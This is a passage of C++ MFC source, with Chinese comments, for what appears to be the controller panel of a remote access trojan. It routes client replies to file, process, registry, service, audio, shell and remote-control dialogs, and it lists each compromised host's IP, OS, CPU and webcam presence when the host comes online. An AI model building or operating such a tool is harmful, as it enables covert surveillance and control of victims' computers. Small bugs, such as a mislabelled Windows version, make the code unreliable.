			CDlgProcessManager*  Dialog = (CDlgProcessManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case WINDOW_MANAGER_DIALOG:
		{
			CDlgWindowManager*  Dialog = (CDlgWindowManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  REMOTE_CONTROL_DIALOG:
		{
			CDlgRemoteControl*  Dialog = (CDlgRemoteControl*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  FILE_MANAGER_DIALOG:
		{
			CDlgFileManager*  Dialog = (CDlgFileManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  AUDIO_MANAGER_DIALOG:
		{
			CDlgAudioManager*  Dialog = (CDlgAudioManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  SERVICE_MANAGER_DIALOG:
		{
			CDlgServiceManager*  Dialog = (CDlgServiceManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case  REGISTER_MANAGER_DIALOG:
		{
			CDlgRegisterManager*  Dialog = (CDlgRegisterManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		}
		return;
	}
	switch (ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case  CLIENT_LOGIN:    //用户登录请求
	{
		//使用自定义登录消息
		__ServerDlg->PostMessageA(UM_CLIENT_LOGIN, NULL, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_GET_OUT_REPLY:
	{
		//回收在当前对象上的异步请求
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}
	case  CLIENT_REMOTE_MESSAGE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_CMD_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_WINDOW_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_REMOTE_CONTROL_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_CONTROL_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_FILE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_AUDIO_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_AUDIO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_SERVICE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case  CLIENT_REGISTER_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	}
}
//用户上线请求
LRESULT CServerDlg::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CString  ClientAddress, HostName, ProcessorNameString, IsWebCameraExist,
		WebSpeed, OSName;
	CONTEXT_OBJECT*  ContextObject = (CONTEXT_OBJECT*)lParam;
	if (ContextObject == NULL)
	{
		return -1;
	}
	CString  v1;
	try
	{
		int  v20 = ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength();
		int  v21 = sizeof(LOGIN_INFORMATION);
		if (v20 != sizeof(LOGIN_INFORMATION))
		{
			return -1;
		}
		LOGIN_INFORMATION*  LoginInfo =
			(PLOGIN_INFORMATION)ContextObject->m_ReceivedDecompressedBufferData.GetArray();
		//获得客户端IP地址
		sockaddr_in  v2;
		memset(&v2, 0, sizeof(v2));
		int  v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//主机名称
		HostName = LoginInfo->HostName;

		//操作系统
		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{
		case  VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
			{
				OSName = "WindowsNT";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5&& LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "Windows2000";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "WindowsXP";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows2003";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "WindowsVista";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "Windows7";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows10";
			}
		}
		//CPU
		ProcessorNameString = LoginInfo->ProcessorNameString;
		//网速
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		//摄像头
		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "有" : "无";

		//向控件添加数据
		AddCtrlListServerOnline(ClientAddress, HostName, OSName, ProcessorNameString, IsWebCameraExist,
				WebSpeed, ContextObject);
		//ContextObject 是放在控件中的隐藏项中
	}
	catch (...) {}
}
void  CServerDlg::AddCtrlListServerOnline(CString ClientAddress, CString  HostName,
	CString  OSName, CString  ProcessorNameString, CString IsWebCameraExist,
	CString  WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), ClientAddress);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, HostName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, OSName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, ProcessorNameString);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 4, IsWebCameraExist);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 5, WebSpeed);

	m_CListCtrl_Server_Dialog_Online.SetItemData(i, (ULONG_PTR)ContextObject);   //插入到该排的隐藏区
	ShowDialogMessage(TRUE, ClientAddress + "主机上线");
}
void CServerDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	char  TimeData[MAX_PATH] = { 0 };
	auto  TimeObject = time(NULL);
	tm   v1;
	localtime_s(&v1, &TimeObject);
	strftime(TimeData, _countof(TimeData), "%Y-%m-%d %H:%M:%S", &v1);
	CString  v2;
	v2.Format("%s", TimeData);
	CString   Title = "Server  ";
	v2 = Title + v2;
	SetWindowTextA(v2);
	CDialogEx::OnTimer(nIDEvent);
}
